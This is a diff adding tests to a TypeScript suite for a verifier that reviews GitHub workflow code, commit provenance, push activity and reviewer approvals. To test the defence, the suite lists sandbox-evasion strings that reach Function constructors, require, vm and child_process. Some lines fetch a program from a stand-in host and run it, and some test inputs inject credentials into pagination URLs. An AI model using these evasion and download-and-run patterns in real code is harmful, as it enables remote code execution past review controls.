@@ -80,9 +80,16 @@ function fixture(options: { workflow?: string; workflowPath?: string; programs?:
   commits.set(evidenceBase, retain(evidenceFiles));
   const locator = { pullRequest: 81, head, documentSha256: '' };
   const pull: Record<string, unknown> = { number: 81, state: 'open', merged: false, user: { id: 9, login: 'preparer', type: 'User' },
-    head: { sha: head, repo: { id: target.id, full_name: 'owner/project' } },
+    commits: 1,
+    head: { sha: head, ref: 'feature/inventory-review', repo: { id: target.id, full_name: 'owner/project' } },
     base: { sha: evidenceBase, repo: { id: target.id, full_name: 'owner/project' } } };
   let reviews: unknown[] = [], permission: unknown = { permission: 'write', user: { id: 17, login: 'reviewer' } };
+  let preparingCommits: unknown[] = [{ sha: head, author: { id: 9, login: 'preparer', type: 'User' },
+    committer: { id: 9, login: 'preparer', type: 'User' } }];
+  let activity: unknown[] = [{ id: 202, ref: 'refs/heads/feature/inventory-review', before: evidenceBase, after: head,
+    activity_type: 'push', actor: { id: 9, login: 'preparer', type: 'User' } },
+  { id: 201, ref: 'refs/heads/feature/inventory-review', before: '0'.repeat(40), after: evidenceBase,
+    activity_type: 'branch_creation', actor: { id: 9, login: 'preparer', type: 'User' } }];
   const seal = () => {
     document.units.sort((a, b) => a.id < b.id ? -1 : a.id > b.id ? 1 : 0);
     document.edges.sort((a, b) => publisherInventoryEdgeIdentity(a) < publisherInventoryEdgeIdentity(b) ? -1 : 1);
@@ -103,6 +110,8 @@ function fixture(options: { workflow?: string; workflowPath?: string; programs?:
     if (route.endsWith('/git/ref/{ref}')) return { data: { ref: 'refs/heads/main', object: { type: 'commit', sha: target.baseSha } } };
     if (route.endsWith('/pulls/{pull_number}')) return { data: pull };
     if (route.endsWith('/reviews')) return { data: reviews.slice((Number(p.page) - 1) * 100, Number(p.page) * 100) };
+    if (route.endsWith('/pulls/{pull_number}/commits')) return { data: preparingCommits.slice((Number(p.page) - 1) * 100, Number(p.page) * 100) };
+    if (route.endsWith('/activity')) return { data: activity };
     if (route.endsWith('/permission')) return { data: permission };
     if (route.endsWith('/git/commits/{commit_sha}')) return { data: { sha: p.commit_sha, tree: { sha: commits.get(String(p.commit_sha)) } } };
     if (route.endsWith('/git/trees/{tree_sha}')) return { data: trees.get(String(p.tree_sha)) };
@@ -115,6 +124,8 @@ function fixture(options: { workflow?: string; workflowPath?: string; programs?:
   const observed = { target, source, tree: sourceTree.root, workflows: [{ path: entryPath, mode: '100644', content: workflow }] };
   return { document, proposal, observed, pull, request, trees, blobs, commits, locator, seal, files, retain, transport,
     setReviews: (value: unknown[]) => { reviews = value; }, setPermission: (value: unknown) => { permission = value; },
+    setPreparingCommits: (value: unknown[]) => { preparingCommits = value; },
+    setActivity: (value: unknown[]) => { activity = value; },
     credentials: sdk.credentials, sourceFiles: sdk.files,
     inspect: () => adapter.inspect(proposal, observed, 'private-inventory-fixture'),
     inspectComplete: (input: SetupPublisherProposal = proposal) => reader.inspect(input) };
@@ -218,6 +229,297 @@ function nodeAction(main: string, helper?: string, concurrency = '') {
     edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'main', role: 'main' },
       ...(helper === undefined ? [] : [{ from: 'main', to: 'helper', role: 'import:1' }])] });
 }
+
+it.each([
+  'globalThis["Function"]("return 1")();',
+  '(function () {})["constructor"]("return 1")();',
+  '(async () => {}).constructor("return 1")();',
+  '(function* () {}).constructor("yield 1")();',
+  'const F = Function; F("return 1")();',
+  'Reflect.construct(Function, ["return 1"])();',
+  'new Proxy(Function, {})("return 1")();',
+  'const { constructor: F } = (() => {}); F("return 1")();',
+  'const f = () => {}; f["con" + "structor"]("return 1")();',
+  'const f = () => {}; f["con\\u0073tructor"]("return 1")();',
+  'Object.getPrototypeOf(async () => {}).constructor("return 1")();',
+  'Object.getOwnPropertyDescriptor(() => {}, "constructor").value("return 1")();',
+  'const O = Object; O.getPrototypeOf(() => {}).constructor("return 1")();',
+  'function unrelated() { const Function = value => value; } Function("return 1")();',
+  'function unrelated() { const globalThis = {}; } globalThis.Function("return 1")();',
+  'function leak() { return this; } leak()["Function"]("return 1")();',
+  'function leak() { "use\\x20strict"; return this; } leak()["Function"]("return 1")();',
+  'function leak() { return arguments.callee.caller.arguments[1]; } leak()("node:fs");',
+  'arguments[1]("node:fs");',
+  'const loader = require; loader("node:fs");',
+  'require.resolve("./helper.js");',
+  'module.require("node:fs");',
+  'const m = module; m.require("node:fs");',
+  'process.getBuiltinModule("node:vm");',
+  'const p = process; p.getBuiltinModule("node:vm");',
+  'Error.prepareStackTrace = (_error, frames) => frames; new Error().stack[0].getThis();',
+  'const frame = {}; frame.getFunction()();',
+  'fetch("https://unbound.invalid/program").then(r => r.text()).then(source => globalThis["Function"](source)());',
+  'import(process.env.MODULE);',
+  'import("data:text/javascript,console.log(1)");',
+  'import("./helper.js", { with: { type: "json" } });',
+  'require("./helper.js", {});',
+  'const = ;',
+] as const)('publisher-inventory-C27: parsed Node closure rejects an unbound execution capability: %s', async program => {
+  const f = nodeAction(program);
+  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
+  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
+  expect(f.request.mock.calls.some(([route]) => route.endsWith('/reviews'))).toBe(false);
+});
+
+it.each(['node:inspector', 'node:inspector/promises', 'node:repl', 'node:vm', 'node:module', 'node:v8', 'node:sqlite',
+  'node:wasi', 'node:child_process', 'node:worker_threads', 'node:test'])(
+  'publisher-inventory-C27: native module %s cannot hide executable input behind a static import', async dependency => {
+    const f = nodeAction(`import * as capability from ${JSON.stringify(dependency)}; console.log(capability);`);
+    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
+  });
+
+it.each([
+  'console.log("Function require eval constructor import");',
+  'function Function(value) { return value; } console.log(Function("data"));',
+  'function local(module) { return module.value; } console.log(local({ value: 1 }));',
+  'const globalThis = { value: 1 }; console.log(globalThis.value);',
+  'class Record { #value = 1; constructor() { this.other = 1; } read() { return this.#value; } } console.log(new Record().read());',
+  '"use strict"; function value() { return this; } console.log(value());',
+  'function value() { "use strict"; return this; } console.log(value());',
+  'const value = () => this; console.log(value());',
+  'const value = { ["literal"]: 1 }; console.log(Object.keys(value));',
+  'console.log([9][0]);',
+  'module.exports = { value: 1 };',
+  'export const value = 1;',
+  'console.log(import.meta.url);',
+  'console.log(process.env.MODE);',
+] as const)('publisher-inventory-C27: parsed source preserves a closed data-only Node program: %s', async program => {
+  const f = nodeAction(program), snapshot = await f.inspectComplete();
+  expect(planSetupPublisherInstallation(f.proposal, snapshot.inspection, '11111111-1111-4111-8111-111111111111').status).toBe('review');
+  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
+});
+
+it('publisher-inventory-C27: a fixed in-memory oracle proves indirect construction executes the unbound program', async () => {
+  const program = 'fetch("https://owned.invalid/program").then(r => r.text()).then(source => globalThis["Function"](source)());';
+  const context = { fetch: async () => ({ text: async () => 'globalThis.observed = "unbound";' }), observed: undefined as string | undefined };
+  await expect(nodeAction(program).inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
+  expect(context.observed).toBeUndefined();
+  await runInNewContext(program, context);
+  expect(context.observed).toBe('unbound');
+});
+
+it.each([['within', 3333, 61], ['within depth', 1, 61], ['node limit', 3334, 1], ['depth limit', 1, 62]] as const)(
+  'publisher-inventory-C27: parsed source has a closed structural bound: %s', async (label, statements, nesting) => {
+    const program = label === 'within' || label === 'node limit' ? 'void 0;\n'.repeat(statements)
+      : `const value = ${'['.repeat(nesting)}0${']'.repeat(nesting)};`;
+    const f = nodeAction(program);
+    if (label === 'within' || label === 'within depth') await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview');
+    else await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
+  });
+
+it('publisher-inventory-C27: distinct static dependencies retain executable source order', async () => {
+  const main = 'import { first } from "./first.js"; export { second } from "./second.js"; console.log(first);';
+  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
+    programs: [{ id: 'action', path: 'action/action.yml', kind: 'action', content: 'name: Owned\nruns:\n  using: node24\n  main: main.js\n' },
+      { id: 'main', path: 'action/main.js', kind: 'node-entrypoint', content: main },
+      { id: 'first', path: 'action/first.js', kind: 'node-entrypoint', content: 'export const first = 1;' },
+      { id: 'second', path: 'action/second.js', kind: 'node-entrypoint', content: 'export const second = 2;' }],
+    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'main', role: 'main' },
+      { from: 'main', to: 'first', role: 'import:1' }, { from: 'main', to: 'second', role: 'import:2' }] });
+  await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview');
+  for (const edge of f.document.edges.filter(edge => edge.from === 'main')) edge.role = edge.role === 'import:1' ? 'import:2' : 'import:1';
+  f.seal(); await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
+});
+
+it.each(['build_linux', '_build'])(
+  'publisher-inventory-C30: actual complete reader binds effective input to a valid job ID: %s', async job => {
+    const workflow = `on: push\njobs:\n  ${job}:\n    env:\n      MODE: reviewed\n    steps:\n      - run: printf reviewed\n`;
+    const f = fixture({ workflow, programs: [{ id: 'job-shell', path: workflowPath, kind: 'shell-program', content: workflow }],
+      edges: [{ from: 'workflow-ci', to: 'job-shell', role: `run:${job}:1` }] });
+    const source = f.document.units.find(unit => unit.id === 'workflow-ci')!;
+    const anchor = { workflow: workflowPath, job, step: 0, input: 'env:MODE', origin: 'job-env' as const };
+    f.document.inputs.push({ id: publisherInventorySha256(anchor), ...anchor, sourceFingerprint: publisherInventorySha256({
+      kind: 'publisher-inventory-input-source', source: { repositoryId: source.repositoryId, commit: source.commit,
+        path: source.path, contentSha256: source.contentSha256 }, definition: 'reviewed', effectiveEnvironment: { MODE: 'reviewed' },
+      callerInputs: {}, variables: {} }) }); f.seal();
+    const snapshot = await f.inspectComplete();
+    expect(planSetupPublisherInstallation(f.proposal, snapshot.inspection, '11111111-1111-4111-8111-111111111111').status).toBe('review');
+  });
+
+it.each(['author', 'committer', 'publisher', 'creator'])(
+  'publisher-inventory-C12: a User account recorded as the evidence %s cannot approve it independently', async role => {
+    const f = fixture(), preparer = { id: 9, login: 'preparer', type: 'User' }, reviewer = { id: 17, login: 'reviewer', type: 'User' };
+    f.setPreparingCommits([{ sha: head, author: role === 'author' ? reviewer : preparer, committer: role === 'committer' ? reviewer : preparer }]);
+    f.setActivity([{ id: 202, ref: 'refs/heads/feature/inventory-review', before: evidenceBase, after: head,
+      activity_type: 'push', actor: role === 'publisher' ? reviewer : preparer },
+    { id: 201, ref: 'refs/heads/feature/inventory-review', before: '0'.repeat(40), after: evidenceBase,
+      activity_type: 'branch_creation', actor: role === 'creator' ? reviewer : preparer }]);
+    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-required' });
+    expect(f.request.mock.calls.some(([route]) => route.endsWith('/activity'))).toBe(true);
+    expect(f.request.mock.calls.some(([route, parameters]) => route.endsWith('/permission')
+      && parameters.owner === 'owner' && parameters.username === 'reviewer')).toBe(false);
+  });
+
+it('publisher-inventory-C12: a bracket-suffixed Bot preparer does not hide an independent User approval', async () => {
+  const f = fixture(), bot = { id: 19, login: 'owned-automation[bot]', type: 'Bot' };
+  f.setPreparingCommits([{ sha: head, author: bot, committer: bot }]);
+  f.setActivity([{ id: 202, ref: 'refs/heads/feature/inventory-review', before: evidenceBase, after: head,
+    activity_type: 'push', actor: bot }, { id: 201, ref: 'refs/heads/feature/inventory-review', before: '0'.repeat(40), after: evidenceBase,
+    activity_type: 'branch_creation', actor: bot }]);
+  await expect(f.inspectComplete()).resolves.toMatchObject({ inspection: { installation: { inventoryReview: { approvals: [{ actorId: 17 }] } } } });
+  expect(f.request.mock.calls.some(([route, parameters]) => route.endsWith('/permission') && parameters.username === bot.login)).toBe(false);
+});
+it('publisher-inventory-C12: bracket-suffixed Bot reviews neither approve nor veto an independent User decision', async () => {
+  const f = fixture(), human = { id: 101, user: { id: 17, login: 'reviewer', type: 'User' }, state: 'APPROVED',
+    submitted_at: '2026-11-28T00:00:00Z', commit_id: head, body: marker(f.document) };
+  const bot = { ...human, id: 102, user: { id: 19, login: 'owned-automation[bot]', type: 'Bot' } };
+  for (const state of ['APPROVED', 'CHANGES_REQUESTED']) {
+    f.setReviews([human, { ...bot, state }]);
+    await expect(f.inspectComplete()).resolves.toMatchObject({ inspection: { installation: { inventoryReview: { approvals: [{ actorId: 17 }] } } } });
+  }
+  f.setReviews([bot]);
+  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-required' });
+  expect(f.request.mock.calls.some(([route, parameters]) => route.endsWith('/permission') && parameters.username === bot.user.login)).toBe(false);
+});
+it('publisher-inventory-C15: changed publication principals change the exact approval while source and reviewer stay fixed', async () => {
+  const f = fixture(), before = await f.inspectComplete();
+  const preparer = { id: 9, login: 'preparer', type: 'User' }, publisher = { id: 19, login: 'publisher', type: 'User' };
+  f.setActivity([{ id: 204, ref: 'refs/heads/feature/inventory-review', before: 'a'.repeat(40), after: head, activity_type: 'force_push', actor: publisher },
+    { id: 203, ref: 'refs/heads/feature/inventory-review', before: head, after: 'a'.repeat(40), activity_type: 'force_push', actor: publisher },
+    { id: 202, ref: 'refs/heads/feature/inventory-review', before: evidenceBase, after: head, activity_type: 'push', actor: preparer },
+    { id: 201, ref: 'refs/heads/feature/inventory-review', before: '0'.repeat(40), after: evidenceBase, activity_type: 'branch_creation', actor: preparer }]);
+  const after = await f.inspectComplete();
+  expect(after.inspection.installation.inventoryReview!.documentSha256).toBe(before.inspection.installation.inventoryReview!.documentSha256);
+  expect(after.inspection.installation.inventoryReview!.decisionsSha256).not.toBe(before.inspection.installation.inventoryReview!.decisionsSha256);
+  const operation = '11111111-1111-4111-8111-111111111111';
+  expect(planSetupPublisherInstallation(f.proposal, after.inspection, operation).approvalDigest)
+    .not.toBe(planSetupPublisherInstallation(f.proposal, before.inspection, operation).approvalDigest);
+});
+
+it.each([0, 251, 1.5, '1', null, undefined])(
+  'publisher-inventory-C50: an incomplete or unsupported commit count cannot establish preparation: %s', async count => {
+    const f = fixture(); f.pull.commits = count;
+    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-unavailable' });
+    expect(f.request.mock.calls.some(([route]) => route.endsWith('/pulls/{pull_number}/commits'))).toBe(false);
+  });
+
+it.each(['missing author', 'missing committer', 'invalid account', 'unsafe login', 'unknown account type',
+  'wrong head', 'duplicate commit', 'inconsistent identity', 'incomplete page', 'overfull page', 'non-array page'])(
+  'publisher-inventory-C50: malformed commit provenance blocks the complete reader: %s', async fault => {
+    const f = fixture(), actor = { id: 9, login: 'preparer', type: 'User' };
+    const commit: Record<string, unknown> = { sha: head, author: actor, committer: actor };
+    if (fault === 'missing author') commit.author = null;
+    if (fault === 'missing committer') commit.committer = null;
+    if (fault === 'invalid account') commit.author = { ...actor, id: 0 };
+    if (fault === 'unsafe login') commit.author = { ...actor, login: 'bad/name' };
+    if (fault === 'unknown account type') commit.author = { ...actor, type: 'Organization' };
+    if (fault === 'wrong head') commit.sha = 'a'.repeat(40);
+    if (fault === 'inconsistent identity') commit.committer = { ...actor, login: 'different-account' };
+    if (fault === 'incomplete page') f.pull.commits = 2;
+    let values: unknown = [commit];
+    if (fault === 'duplicate commit') { f.pull.commits = 2; values = [commit, commit]; }
+    if (fault === 'overfull page') { f.pull.commits = 101; values = Array.from({ length: 101 }, () => commit); }
+    if (fault === 'non-array page') values = {};
+    const original = f.request.getMockImplementation()!;
+    f.request.mockImplementation(async (route, parameters) => route.endsWith('/pulls/{pull_number}/commits')
+      ? { data: values } : original(route, parameters));
+    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-unavailable' });
+    expect(f.request.mock.calls.some(([route]) => route.endsWith('/reviews'))).toBe(false);
+  });
+
+it('publisher-inventory-C50: the complete250-commit boundary is read through all three authenticated pages', async () => {
+  const f = fixture(), actor = { id: 9, login: 'preparer', type: 'User' };
+  f.pull.commits = 250;
+  f.setPreparingCommits(Array.from({ length: 250 }, (_, index) => ({ sha: index === 249 ? head : (index + 1).toString(16).padStart(40, '0'),
+    author: actor, committer: actor })));
+  await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview');
+  expect(f.request.mock.calls.filter(([route]) => route.endsWith('/pulls/{pull_number}/commits')).map(([, parameters]) => parameters.page)).toEqual([1, 2, 3]);
+});
+
+it.each(['missing creation', 'unpublished head', 'foreign ref', 'duplicate event', 'malformed event', 'invalid before',
+  'invalid after', 'unknown activity', 'unknown actor', 'empty page', 'overfull page', 'non-array page'])(
+  'publisher-inventory-C50: incomplete or contradictory publication history stays unverified: %s', async fault => {
+    const f = fixture(), actor = { id: 9, login: 'preparer', type: 'User' };
+    const push: Record<string, unknown> = { id: 202, ref: 'refs/heads/feature/inventory-review', before: evidenceBase, after: head,
+      activity_type: 'push', actor };
+    const creation = { id: 201, ref: push.ref, before: '0'.repeat(40), after: evidenceBase, activity_type: 'branch_creation', actor };
+    if (fault === 'unpublished head') push.after = 'a'.repeat(40);
+    if (fault === 'foreign ref') push.ref = 'refs/heads/unrelated';
+    if (fault === 'malformed event') push.id = 0;
+    if (fault === 'invalid before') push.before = 'not-a-sha';
+    if (fault === 'invalid after') push.after = 'not-a-sha';
+    if (fault === 'unknown activity') push.activity_type = 'unrecognized';
+    if (fault === 'unknown actor') push.actor = null;
+    let values: unknown = fault === 'missing creation' ? [push] : [push, creation];
+    if (fault === 'duplicate event') values = [push, push];
+    if (fault === 'empty page') values = [];
+    if (fault === 'overfull page') values = Array.from({ length: 101 }, () => push);
+    if (fault === 'non-array page') values = {};
+    const original = f.request.getMockImplementation()!;
+    f.request.mockImplementation(async (route, parameters) => route.endsWith('/activity') ? { data: values } : original(route, parameters));
+    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-unavailable' });
+  });
+
+const publicationLink = (cursor: string) => '<https://api.github.com/repos/owner/project/activity?'
+  + new URLSearchParams({ ref: 'refs/heads/feature/inventory-review', per_page: '100', direction: 'desc', after: cursor }) + '>; rel="next"';
+
+it('publisher-inventory-C50: authenticated cursor pagination includes a publishing actor on a later page', async () => {
+  const f = fixture(), original = f.request.getMockImplementation()!, actor = { id: 9, login: 'preparer', type: 'User' };
+  f.request.mockImplementation(async (route, parameters) => {
+    if (!route.endsWith('/activity')) return original(route, parameters);
+    if (parameters.after === undefined) return { data: [{ id: 202, ref: 'refs/heads/feature/inventory-review', before: evidenceBase,
+      after: head, activity_type: 'push', actor }], headers: { link: publicationLink('second') } };
+    expect(parameters.after).toBe('second');
+    return { data: [{ id: 201, ref: 'refs/heads/feature/inventory-review', before: '0'.repeat(40), after: evidenceBase,
+      activity_type: 'branch_creation', actor: { id: 17, login: 'reviewer', type: 'User' } }], headers: {} };
+  });
+  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-required' });
+  expect(f.request.mock.calls.filter(([route]) => route.endsWith('/activity'))).toHaveLength(2);
+});
+
+it.each([
+  ['foreign origin', publicationLink('second').replace('api.github.com', 'example.invalid')],
+  ['foreign repository', publicationLink('second').replace('/owner/project/', '/other/project/')],
+  ['different ref', publicationLink('second').replace('inventory-review', 'other')],
+  ['changed page size', publicationLink('second').replace('per_page=100', 'per_page=99')],
+  ['changed direction', publicationLink('second').replace('direction=desc', 'direction=asc')],
+  ['URL credentials', publicationLink('second').replace('https://', 'https://user:password@')],
+  ['fragment', publicationLink('second').replace('>;', '#fragment>;')],
+  ['duplicate query', publicationLink('second').replace('>;', '&ref=other>;')],
+  ['extra query', publicationLink('second').replace('>;', '&token=unreviewed>;')],
+  ['ambiguous cursor', publicationLink('second').replace('>;', '&before=other>;')],
+  ['empty cursor', publicationLink('')],
+  ['long cursor', publicationLink('x'.repeat(2049))],
+  ['control cursor', publicationLink('\u0000')],
+  ['malformed URL', '<not-a-url>; rel="next"'],
+  ['duplicate relation', publicationLink('one') + ',' + publicationLink('two')],
+  ['unknown relation', publicationLink('second').replace('rel="next"', 'rel="unknown"')],
+  ['non-text header', 12],
+  ['oversized header', 'x'.repeat(16_385)],
+] as const)('publisher-inventory-C50: pagination cannot substitute a different authenticated activity scope: %s', async (_fault, link) => {
+  const f = fixture(), original = f.request.getMockImplementation()!;
+  f.request.mockImplementation(async (route, parameters) => {
+    const response = await original(route, parameters);
+    return route.endsWith('/activity') ? { data: response.data, headers: { link: link as unknown as string } } : response;
+  });
+  await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-unavailable' });
+  expect(f.request.mock.calls.filter(([route]) => route.endsWith('/activity'))).toHaveLength(1);
+  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
+});
+
+it.each(['repeated cursor', 'pagination exhausted', 'empty continuing page'])(
+  'publisher-inventory-C50: incomplete activity pagination never becomes complete authority: %s', async fault => {
+    const f = fixture(), original = f.request.getMockImplementation()!; let calls = 0;
+    f.request.mockImplementation(async (route, parameters) => {
+      if (!route.endsWith('/activity')) return original(route, parameters);
+      calls++;
+      return { data: fault === 'empty continuing page' ? [] : [{ id: 300 + calls, ref: 'refs/heads/feature/inventory-review',
+        before: evidenceBase, after: head, activity_type: 'push', actor: { id: 9, login: 'preparer', type: 'User' } }],
+      headers: { link: publicationLink(fault === 'repeated cursor' ? 'same' : String(calls)) } };
+    });
+    await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'review-unavailable' });
+    expect(calls).toBe(fault === 'pagination exhausted' ? 10 : fault === 'repeated cursor' ? 2 : 1);
+  });
 
 it.each(['non-object page', 'overfull page', 'missing actor', 'unsafe login', 'unknown actor category',
   'unknown review state', 'non-text body', 'non-text submission', 'invalid commit'] as const)(
@@ -541,14 +843,77 @@ it('publisher-inventory-C29: an actual checkout call without a literal immutable
     expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
   }
 });
-it('publisher-inventory-C29: a nonexistent dollar-slash Action syntax cannot bypass immutable checkout proof', async () => {
-  const f = fixture({ workflow: 'on: push\njobs:\n  inspect:\n    steps:\n      - uses: $/action\n',
+it.each(['root action', 'action', 'reusable workflow'] as const)(
+  'publisher-inventory-C29: documented dollar-slash %s binds the containing source without checkout', async kind => {
+    const action = kind !== 'reusable workflow', path = kind === 'root action' ? 'action.yml'
+      : action ? 'action/action.yml' : '.github/workflows/reusable.yml';
+    const content = action ? 'name: Fixture\nruns:\n  using: composite\n  steps:\n    - run: printf reviewed\n      shell: bash\n'
+      : 'on:\n  workflow_call: {}\njobs:\n  child:\n    steps:\n      - run: printf reviewed\n';
+    const f = fixture({ workflow: action ? `on: push\njobs:\n  inspect:\n    steps:\n      - uses: ${kind === 'root action' ? '$/' : '$/action'}\n`
+      : `on: push\njobs:\n  inspect:\n    uses: $/${path}\n`,
+    programs: [{ id: 'called', path, kind: action ? 'composite-action' : 'reusable-workflow', content },
+      { id: 'called-shell', path, kind: 'shell-program', content }],
+    edges: [{ from: 'workflow-ci', to: 'called', role: action ? 'uses:inspect:1' : 'uses:inspect' },
+      { from: 'called', to: 'called-shell', role: action ? 'run:composite:1' : 'run:child:1' }] });
+    if (!action) {
+      f.document.workflows.push({ path, mode: '100644', blob: blob(content), contentSha256: hash(content),
+        entryUnits: ['workflow-reusable'], disposition: 'non-producer' });
+      f.document.units.push({ ...f.document.units.find(unit => unit.id === 'called')!, id: 'workflow-reusable', kind: 'workflow' });
+      f.document.edges.push({ from: 'workflow-reusable', to: 'called-shell', role: 'run:child:1' });
+      f.document.workflowSetSha256 = publisherInventoryWorkflowSetSha256(f.document.workflows);
+      f.seal();
+    }
+    const snapshot = await f.inspectComplete();
+    expect(planSetupPublisherInstallation(f.proposal, snapshot.inspection, '11111111-1111-4111-8111-111111111111').status).toBe('review');
+    expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
+  });
+it('publisher-inventory-C29: nested dollar-slash uses the external containing repository and commit', async () => {
+  const commit = 'a'.repeat(40), path = '.github/workflows/reusable.yml', actionPath = 'action/action.yml';
+  const reusable = 'on:\n  workflow_call: {}\njobs:\n  child:\n    steps:\n      - uses: $/action\n';
+  const action = 'name: Fixture\nruns:\n  using: composite\n  steps:\n    - run: printf reviewed\n      shell: bash\n';
+  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    uses: owner/reuse/${path}@${commit}\n`,
+    programs: [{ id: 'reusable', path, kind: 'reusable-workflow', content: reusable },
+      { id: 'action', path: actionPath, kind: 'composite-action', content: action },
+      { id: 'action-shell', path: actionPath, kind: 'shell-program', content: action }],
+    edges: [{ from: 'workflow-ci', to: 'reusable', role: 'uses:inspect' },
+      { from: 'reusable', to: 'action', role: 'uses:child:1' },
+      { from: 'action', to: 'action-shell', role: 'run:composite:1' }] });
+  f.files.delete(path);
+  const targetTree = f.retain(f.files), externalTree = f.retain(new Map([[path, reusable], [actionPath, action]]));
+  f.commits.set(f.proposal.destination.head, targetTree); f.commits.set(commit, externalTree);
+  f.document.destination.tree = f.observed.tree = targetTree;
+  for (const unit of f.document.units) {
+    if (unit.id === 'workflow-ci') unit.tree = targetTree;
+    else Object.assign(unit, { repository: 'owner/reuse', repositoryId: 71, commit, tree: externalTree });
+  }
+  f.seal(); const original = f.request.getMockImplementation()!;
+  f.request.mockImplementation(async (route, parameters) => {
+    if (parameters.owner !== 'owner' || parameters.repo !== 'reuse') return original(route, parameters);
+    if (route === 'GET /repos/{owner}/{repo}') return { data: { id: 71, full_name: 'owner/reuse' } };
+    return original(route, { ...parameters, repo: 'project' });
+  });
+  const snapshot = await f.inspectComplete();
+  expect(planSetupPublisherInstallation(f.proposal, snapshot.inspection, '11111111-1111-4111-8111-111111111111').status).toBe('review');
+  // Identical bytes really exist in the destination, but they are not the
+  // action selected by the external reusable workflow's self reference.
+  for (const unit of f.document.units.filter(u => u.id.startsWith('action'))) Object.assign(unit,
+    { repository: 'owner/project', repositoryId: f.observed.target.id, commit: f.proposal.destination.head, tree: targetTree });
+  f.seal(); await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'binding-mismatch' });
+  const differentCommit = 'b'.repeat(40); f.commits.set(differentCommit, externalTree);
+  for (const unit of f.document.units.filter(u => u.id.startsWith('action'))) Object.assign(unit,
+    { repository: 'owner/reuse', repositoryId: 71, commit: differentCommit, tree: externalTree });
+  f.seal(); await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'binding-mismatch' });
+  expect(f.request.mock.calls.every(([route]) => route.startsWith('GET '))).toBe(true);
+});
+it.each(['$/action@main', `$/action@${'1'.repeat(40)}`, '$/../action'])(
+  'publisher-inventory-C29: invalid dollar-slash source reference is rejected: %s', async reference => {
+  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: ${reference}\n`,
     programs: [{ id: 'action', path: 'action/action.yml', kind: 'composite-action',
       content: 'name: Fixture\nruns:\n  using: composite\n  steps: []\n' }],
     edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }] });
   await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
   expect(f.request.mock.calls.some(([r]) => r.endsWith('/reviews'))).toBe(false);
-});
+  });
 it('publisher-inventory-C30: unavailable Variables stay unresolved before any independent approval is considered', async () => {
   const f = fixture({ workflow: 'on: push\nenv:\n  SELECTOR: ${{ vars.SELECTOR }}\njobs:\n  inspect:\n    steps: []\n' });
   await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
@@ -1075,6 +1440,19 @@ it('binds a composite inline shell callee through its action path rather than an
   await expect(f.inspect()).resolves.toMatchObject({ approvals: [{ actorId: 17 }] });
   f.document.edges = f.document.edges.filter(e => e.role !== 'program:1'); f.seal();
   await expect(f.inspect()).rejects.toMatchObject({ reason: 'unresolved-closure' });
+});
+it.each(['ordered', 'swapped'] as const)('publisher-inventory-C29: composite shell binds two callees in command order: %s', async order => {
+  const action = 'name: Fixture\nruns:\n  using: composite\n  steps:\n    - run: node "$GITHUB_ACTION_PATH/first.js" && node "$GITHUB_ACTION_PATH/second.js"\n      shell: bash\n';
+  const f = fixture({ workflow: `on: push\njobs:\n  inspect:\n    steps:\n      - uses: owner/project/action@${'1'.repeat(40)}\n`,
+    programs: [{ id: 'action', path: 'action/action.yml', kind: 'composite-action', content: action },
+      { id: 'inline', path: 'action/action.yml', kind: 'shell-program', content: action },
+      { id: 'first', path: 'action/first.js', kind: 'node-entrypoint', content: 'console.log("first");' },
+      { id: 'second', path: 'action/second.js', kind: 'node-entrypoint', content: 'console.log("second");' }],
+    edges: [{ from: 'workflow-ci', to: 'action', role: 'uses:inspect:1' }, { from: 'action', to: 'inline', role: 'run:composite:1' },
+      { from: 'inline', to: 'first', role: order === 'ordered' ? 'program:1' : 'program:2' },
+      { from: 'inline', to: 'second', role: order === 'ordered' ? 'program:2' : 'program:1' }] });
+  if (order === 'ordered') await expect(f.inspectComplete()).resolves.toHaveProperty('inspection.installation.inventoryReview');
+  else await expect(f.inspectComplete()).rejects.toMatchObject({ reason: 'unresolved-closure' });
 });
 it('does not accept an unresolved matrix, a dynamic shell command or ambiguous action manifests as complete closure', async () => {
   for (const body of ['on: push\njobs:\n  inspect:\n    strategy:\n      matrix:\n        os: [linux, windows]\n    steps: []\n',
